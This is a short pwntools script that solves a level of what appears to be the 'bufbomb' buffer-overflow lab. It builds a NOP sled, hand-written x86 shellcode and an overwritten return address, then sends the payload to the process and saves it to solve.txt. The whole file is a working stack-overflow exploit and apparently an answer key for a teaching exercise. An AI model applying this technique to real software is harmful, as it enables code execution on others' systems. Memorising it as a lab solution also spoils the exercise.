from pwn import *

binary = context.binary = ELF('./bufbomb')

p = process(['./bufbomb', '-u', '19780982'])

shellcode = b'\x31\xc0\xb8\x60\xf1\x13\x80\xbb\x06\x58\x27\x24\x89\x18\x68\x69\x9b\x13\x80\xc3'

offset = (0x28+4-len(shellcode))
payload = b''
payload += b'\x90'*offset

payload += shellcode
payload += p32(0x556830d8)


f = open('solve.txt', 'wb')
f.write(payload)


p.sendline(payload)

p.interactive()
